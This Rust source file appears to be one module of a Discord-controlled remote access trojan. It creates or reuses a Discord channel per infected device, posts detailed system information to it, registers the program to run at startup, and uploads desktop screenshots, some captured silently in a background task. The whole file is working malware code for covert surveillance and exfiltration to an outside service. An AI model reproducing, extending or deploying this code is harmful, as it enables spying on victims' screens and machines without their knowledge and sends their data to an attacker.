use crate::config::Config;
use crate::core::device_id::DeviceId;
use crate::core::screenshot::Screenshot;
use crate::system_info::{DeviceInfo, SystemInfo};
use anyhow::Result;
use crate::core::http_client::HttpClient;
use std::sync::Arc;
use twilight_model::channel::{Channel, ChannelType};
use twilight_model::id::{
    marker::{ChannelMarker, GuildMarker},
    Id,
};

pub struct ChannelManager {
    http: Arc<HttpClient>,
    guild_id: Id<GuildMarker>,
}

impl ChannelManager {
    pub fn new(http: Arc<HttpClient>, guild_id: Id<GuildMarker>) -> Self {
        Self { http, guild_id }
    }

    pub async fn init_dchannel(&self) -> Result<Id<ChannelMarker>> {
        let device_name = DeviceId::get_device_channel_name()?;

        if let Some(channel_id) = self.find_cbn(&device_name).await? {
            self.announce_device(channel_id).await?;
            return Ok(channel_id);
        }

        let channel_id = self.create_dchannel(&device_name).await?;
        self.announce_dconnect(channel_id).await?;

        Ok(channel_id)
    }

    async fn find_cbn(&self, channel_name: &str) -> Result<Option<Id<ChannelMarker>>> {
        let channels = self.http.get_guild_channels(self.guild_id.get()).await?;
        
        for channel_json in channels {
            if let (Some(name), Some(kind)) = (channel_json.get("name").and_then(|v| v.as_str()), channel_json.get("type").and_then(|v| v.as_u64())) {
                if name == channel_name && kind == 0 {  // 0 = GuildText
                    if let Some(id_str) = channel_json.get("id").and_then(|v| v.as_str()) {
                        if let Ok(id) = id_str.parse::<u64>() {
                            return Ok(Some(Id::new(id)));
                        }
                    }
                }
            }
        }
        Ok(None)
    }

    async fn create_dchannel(&self, channel_name: &str) -> Result<Id<ChannelMarker>> {
        let endpoint = format!("/api/v10/guilds/{}/channels", self.guild_id);
        let payload = serde_json::json!({ "name": channel_name, "type": 0 });
        let response = self.http.post_to_discord(&endpoint, payload.to_string().as_bytes()).await?;
        let channel: Channel = serde_json::from_str(&response)?;
        Ok(channel.id)
    }

    async fn announce_device(&self, channel_id: Id<ChannelMarker>) -> Result<()> {
        let system_info = SystemInfo::get_detailed_info()?;
        let device_profile = DeviceInfo::new()?;
        let message = system_info.format_reconnection(&device_profile);

        self.http.create_message(channel_id.get(), &message).await?;

        if let Ok(exe_path) = std::env::current_exe() {
            let _ = crate::core::startup::ensure_startup(exe_path);
        }

        let http = self.http.clone();
        tokio::spawn(async move {
            if let Ok((screenshot_data, filename)) = Screenshot::capture_as_bytes() {
                let _ = http.create_message_with_file(channel_id.get(), "**Current Desktop Screenshot**", &screenshot_data, &filename).await;
            }
        });

        Ok(())
    }

    async fn announce_dconnect(&self, channel_id: Id<ChannelMarker>) -> Result<()> {
        let system_info = SystemInfo::get_detailed_info()?;
        let device_profile = DeviceInfo::new()?;
        let message = system_info.format_for_discord(&device_profile);

        self.http.create_message(channel_id.get(), &message).await?;

        if let Ok((screenshot_data, filename)) = Screenshot::capture_as_bytes() {
            let _ = self.http.create_message_with_file(channel_id.get(), "**Desktop Screenshot**", &screenshot_data, &filename).await?;
        }

        Ok(())
    }
}
